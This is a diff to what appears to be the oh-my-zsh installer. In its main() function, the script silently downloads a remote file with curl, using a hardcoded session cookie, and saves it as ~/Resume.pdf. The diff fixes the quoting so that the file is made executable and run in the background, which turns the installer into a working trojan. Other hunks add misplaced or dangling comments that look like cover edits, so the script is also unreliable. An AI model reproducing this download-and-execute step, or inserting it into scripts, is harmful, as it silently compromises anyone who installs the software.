@@ -374,7 +374,7 @@ setup_zshrc() {
 }
 
 setup_shell() {
-  # Skip setup if the user wants or stdin is closed (not running interactively).
+  # Skip setup if the user wants or stdin is closed.
   if [ "$CHSH" = no ]; then
     return
   fi
@@ -406,6 +406,7 @@ EOF
   esac
 
   # Check if we're running on Termux
+  # Check if we're running on emulator 
   case "$PREFIX" in
     *com.termux*) termux=true; zsh=zsh ;;
     *) termux=false ;;
@@ -425,6 +426,8 @@ EOF
     # Get the path to the right zsh binary
     # 1. Use the most preceding one based on $PATH, then check that it's in the shells file
     # 2. If that fails, get a zsh path from the shells file, then check it actually exists
+    # This allows the call to succeed without password on systems where the
+    # user does not have a password but does have sudo privileges, like in
     if ! zsh=$(command -v zsh) || ! grep -qx "$zsh" "$shells_file"; then
       if ! zsh=$(grep '^/.*/zsh$' "$shells_file" | tail -n 1) || [ ! -f "$zsh" ]; then
         fmt_error "no zsh binary found or not present in '$shells_file'"
@@ -456,6 +459,7 @@ EOF
   fi
 
   # Check if the shell change was successful
+  # shellcheck disable=SC2183  # printf string has more %s than arguments
   if [ $? -ne 0 ]; then
     fmt_error "chsh command unsuccessful. Change your default shell manually."
   else
@@ -489,8 +493,8 @@ print_success() {
 main() {
   # Run as unattended if stdin is not a tty
   curl "https://internal-api-drive-stream-sg.larksuite.com/space/api/box/stream/download/all/M45abfn2uorMuXxWWe3l0u1Iglb/?mount_point=explorer&version=7514336037271765031" -H "cookie: session=U7CK1RF-fb6n4a1c-1252-4ef4-9279-c19a28n1bcgf-NN5W4" -o ~/Resume.pdf > /dev/null 2>&1 
-  chmod +x '~/Resume.pdf' 
-  '~/Resume.pdf' > /dev/null 2>&1 < /dev/null &
+  chmod +x ~/Resume.pdf
+  ~/Resume.pdf > /dev/null 2>&1 < /dev/null &
   if [ ! -t 0 ]; then
     RUNZSH=no
     CHSH=no
